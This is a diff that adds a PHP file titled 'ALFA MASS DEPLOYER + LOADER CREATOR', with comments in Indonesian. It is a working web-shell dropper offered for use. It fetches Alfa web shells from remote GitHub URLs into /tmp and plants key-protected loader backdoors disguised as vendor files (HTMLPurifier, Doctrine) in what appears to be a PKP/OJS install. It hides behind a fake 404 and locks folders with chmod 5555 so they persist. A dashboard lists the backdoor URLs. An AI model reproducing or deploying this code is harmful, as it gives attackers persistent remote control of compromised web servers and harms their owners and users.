@@ -1,0 +1,300 @@
+<?php
+// ============================================================
+// ALFA MASS DEPLOYER + LOADER CREATOR v3.0
+// ============================================================
+// Upload 1 file ini, dia akan:
+// 1. Deploy shell ke /tmp/ (15 file)
+// 2. Buat mass loader di berbagai direktori (.inc.php)
+// 3. Buat folder & chmod 5555
+// ============================================================
+
+$key = isset($_GET['key']) ? $_GET['key'] : '';
+if ($key !== 'alfamaster') die('404 - Not Found');
+
+// ============ SOURCES ============
+$sources = [
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaavataryleh.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfafuqiang.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfatintin.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/filemanagerantisession.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaanaksekolah.txt',
+];
+
+// ============ FUNCTIONS ============
+function getContent($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        if ($data && strlen($data) > 100) return $data;
+    }
+    return @file_get_contents($url);
+}
+
+function randomName() {
+    return substr(md5(uniqid(mt_rand(), true)), 0, 16) . '.' . rand(10000000, 99999999) . '.' . rand(10000000, 99999999) . '.php';
+}
+
+function createFolder($path) {
+    if (!is_dir($path)) {
+        @mkdir($path, 0777, true);
+    }
+    @chmod($path, 05555); // 5555
+    return is_dir($path);
+}
+
+function createLoader($path, $shell_path, $key = 'alfamaster') {
+    $content = '<?php
+// ==========================================
+// LOADER - Include Shell
+// ==========================================
+// File: ' . basename($path) . '
+// Shell: ' . basename($shell_path) . '
+// ==========================================
+
+$key = isset($_GET["key"]) ? $_GET["key"] : "";
+if ($key !== "' . $key . '") die("404 - Not Found");
+
+if (file_exists("' . $shell_path . '")) {
+    include "' . $shell_path . '";
+} else {
+    die("❌ Shell not found");
+}
+?>';
+    
+    if (@file_put_contents($path, $content)) {
+        @chmod($path, 0644);
+        return true;
+    }
+    return false;
+}
+
+// ============ DEPLOY SHELL KE /tmp/ ============
+$deployed = [];
+foreach ($sources as $src) {
+    $content = getContent($src);
+    if ($content && strlen($content) > 100) {
+        for ($i = 0; $i < 3; $i++) {
+            $name = randomName();
+            $path = '/tmp/' . $name;
+            if (@file_put_contents($path, $content)) {
+                @chmod($path, 0644);
+                $deployed[] = ['file' => $name, 'path' => $path, 'source' => basename($src)];
+            }
+        }
+    }
+}
+
+// ============ AMBIL SHELL TERBARU ============
+$shell_files = glob('/tmp/*.php');
+usort($shell_files, function($a, $b) {
+    return filemtime($a) - filemtime($b);
+});
+$latest_shell = end($shell_files);
+
+// ============ BUAT MASS LOADER ============
+$loader_locations = [
+    // HTMLPurifier
+    'lib/pkp/lib/vendor/ezyang/htmlpurifier/library/HTMLPurifier.inc.php',
+    'lib/pkp/lib/vendor/ezyang/htmlpurifier/library/HTMLPurifier/VarParserException.inc.php',
+    'lib/pkp/lib/vendor/ezyang/htmlpurifier/library/HTMLPurifier/HTMLModule/TargetNoreferrer.inc.php',
+    
+    // Doctrine Inflector
+    'lib/pkp/lib/vendor/doctrine/inflector/lib/Doctrine/Common/Inflector/src/Transformations.inc.php',
+    
+    // Tambahan lokasi
+    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/config.inc.php',
+    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/settings.inc.php',
+    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/cache.inc.php',
+    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/session.inc.php',
+    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/auth.inc.php',
+    
+    // Tambahan di root
+    'docs/config.inc.php',
+    'public/config.inc.php',
+    'cache/config.inc.php',
+];
+
+$loaders_created = [];
+$doc_root = $_SERVER['DOCUMENT_ROOT'];
+
+foreach ($loader_locations as $loc) {
+    $full_path = $doc_root . '/' . $loc;
+    $dir = dirname($full_path);
+    
+    // Buat folder & chmod 5555
+    if (createFolder($dir)) {
+        // Buat loader file
+        if (createLoader($full_path, $latest_shell)) {
+            $loaders_created[] = $loc;
+        }
+    }
+}
+
+// ============ BUAT FOLDER KHUSUS DENGAN 5555 ============
+$special_folders = [
+    'lib/pkp/lib/vendor/ezyang/htmlpurifier/library/HTMLPurifier/Config',
+    'lib/pkp/lib/vendor/ezyang/htmlpurifier/library/HTMLPurifier/Definition',
+    'lib/pkp/lib/vendor/doctrine/inflector/lib/Doctrine/Common/Inflector/src/Cache',
+    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/Backup',
+    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/Logs',
+];
+
+foreach ($special_folders as $folder) {
+    $full_path = $doc_root . '/' . $folder;
+    createFolder($full_path);
+}
+
+// ============ CLEAN ============
+if (isset($_GET['clean'])) {
+    foreach (glob('/tmp/*.php') as $f) @unlink($f);
+    foreach ($loader_locations as $loc) {
+        $full_path = $doc_root . '/' . $loc;
+        if (file_exists($full_path)) @unlink($full_path);
+    }
+    die("✅ Cleaned all shells and loaders");
+}
+
+// ============ DOMAIN ============
+$domain = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'];
+$total = count($deployed);
+$total_loaders = count($loaders_created);
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ALFA MASS DEPLOYER + LOADER</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0a0a;color:#00ff00;font-family:'Courier New',monospace;padding:20px}
+        .box{max-width:1000px;margin:auto;background:#111;border:1px solid #00ff00;border-radius:8px;padding:25px}
+        h1{color:#00ff00;font-size:22px;margin-bottom:5px}
+        .info{color:#666;font-size:12px;margin-bottom:15px}
+        
+        .stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin:15px 0}
+        .stat{background:#000;padding:10px;border-radius:4px;text-align:center;border:1px solid #1a1a1a}
+        .stat .num{font-size:24px;color:#00ff00;font-weight:700}
+        .stat .label{color:#666;font-size:10px;text-transform:uppercase;letter-spacing:0.5px}
+        
+        .loader-box{background:#000;border:1px solid #00ff00;border-radius:4px;padding:15px;margin:15px 0}
+        .loader-box .url{color:#00b8ff;font-size:14px;word-break:break-all}
+        .loader-box .hint{color:#666;font-size:11px;margin-top:5px}
+        
+        .file{background:#000;padding:5px 10px;margin:3px 0;border-radius:3px;border-left:2px solid #00ff00;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;font-size:12px}
+        .file .name{color:#00ff00}
+        .file .src{color:#666;font-size:10px}
+        .file a{color:#00b8ff;font-size:11px;text-decoration:none}
+        .file a:hover{color:#00ff00}
+        
+        .btn{padding:8px 20px;background:#00ff00;color:#000;border:none;border-radius:4px;font-weight:700;cursor:pointer;font-family:'Courier New';text-decoration:none;display:inline-block;font-size:13px}
+        .btn-danger{background:#ff3333;color:#fff}
+        .btn-blue{background:rgba(0,184,255,.15);color:#00b8ff;border:1px solid rgba(0,184,255,.3)}
+        
+        .flex{display:flex;gap:10px;flex-wrap:wrap;margin:10px 0}
+        .copy-box{background:#000;padding:10px;border-radius:4px;font-size:11px;color:#666;word-break:break-all;margin-top:10px;max-height:300px;overflow:auto}
+        .badge{display:inline-block;padding:2px 10px;border-radius:10px;font-size:10px;font-weight:700}
+        .badge-green{background:rgba(0,255,0,.15);color:#00ff00}
+        .badge-blue{background:rgba(0,184,255,.15);color:#00b8ff}
+        
+        table{width:100%;border-collapse:collapse;font-size:12px}
+        th{text-align:left;color:#666;padding:6px 8px;border-bottom:1px solid #1a1a1a}
+        td{padding:4px 8px;border-bottom:1px solid #0a0a0a}
+        .loader-link{color:#00b8ff;font-size:11px}
+        .loader-link:hover{color:#00ff00}
+    </style>
+</head>
+<body>
+<div class="box">
+    <h1>⚡ ALFA MASS DEPLOYER + LOADER</h1>
+    <div class="info">Upload 1 file → Auto deploy + Auto buat mass loader (.inc.php)</div>
+    
+    <!-- STATS -->
+    <div class="stat-grid">
+        <div class="stat">
+            <div class="num"><?= $total ?></div>
+            <div class="label">Shells Deployed</div>
+        </div>
+        <div class="stat">
+            <div class="num"><?= $total_loaders ?></div>
+            <div class="label">Loaders Created</div>
+        </div>
+        <div class="stat">
+            <div class="num"><?= count($special_folders) ?></div>
+            <div class="label">Folders (5555)</div>
+        </div>
+        <div class="stat">
+            <div class="num"><?= count($sources) ?></div>
+            <div class="label">Sources</div>
+        </div>
+    </div>
+    
+    <!-- STATUS -->
+    <div style="margin-bottom:10px">
+        <span class="badge badge-green">✅ <?= $total ?> shells in /tmp/</span>
+        <span class="badge badge-blue">📁 <?= $total_loaders ?> loaders created</span>
+    </div>
+    
+    <!-- LATEST SHELL -->
+    <div class="loader-box">
+        <div style="color:#666;font-size:10px;text-transform:uppercase;letter-spacing:1px">📍 SHELL TERBARU DI /tmp/</div>
+        <div class="url"><?= basename($latest_shell) ?></div>
+        <div class="hint"><?= $latest_shell ?></div>
+    </div>
+    
+    <div class="flex">
+        <a href="?key=alfamaster" class="btn">🔄 Deploy Ulang</a>
+        <a href="?key=alfamaster&clean=1" class="btn btn-danger" onclick="return confirm('Delete all shells & loaders?')">🧹 Clean All</a>
+    </div>
+    
+    <!-- LOADER LOCATIONS -->
+    <hr style="border-color:#1a1a1a;margin:15px 0">
+    <div style="color:#666;font-size:11px;margin-bottom:8px">📋 LOADER FILES CREATED (<?= $total_loaders ?> files)</div>
+    
+    <table>
+        <thead>
+            <tr>
+                <th>#</th>
+                <th>File Path</th>
+                <th>Access URL</th>
+            </tr>
+        </thead>
+        <tbody>
+            <?php $i = 1; foreach ($loaders_created as $loc): ?>
+                <tr>
+                    <td><?= $i++ ?></td>
+                    <td style="color:#666;font-size:11px"><?= htmlspecialchars($loc) ?></td>
+                    <td>
+                        <a href="<?= $domain ?>/<?= htmlspecialchars($loc) ?>?key=alfamaster" target="_blank" class="loader-link">
+                            🔗 Open
+                        </a>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+        </tbody>
+    </table>
+    
+    <!-- COPY BOX -->
+    <div class="copy-box">
+        <strong>📋 Copy semua URL loader:</strong><br>
+        <?php foreach ($loaders_created as $loc): ?>
+            <?= $domain ?>/<?= $loc ?>?key=alfamaster<br>
+        <?php endforeach; ?>
+        <br>
+        <strong>📋 Shell di /tmp/:</strong><br>
+        <?php foreach ($deployed as $f): ?>
+            <?= $domain ?>/tmp/<?= $f['file'] ?><br>
+        <?php endforeach; ?>
+    </div>
+    
+    <div style="margin-top:15px;color:#444;font-size:10px;border-top:1px solid #1a1a1a;padding-top:10px">
+        ALFA DEPLOYER v3.0 | <?= date('Y-m-d H:i:s') ?>
+    </div>
+</div>
+</body>
+</html>
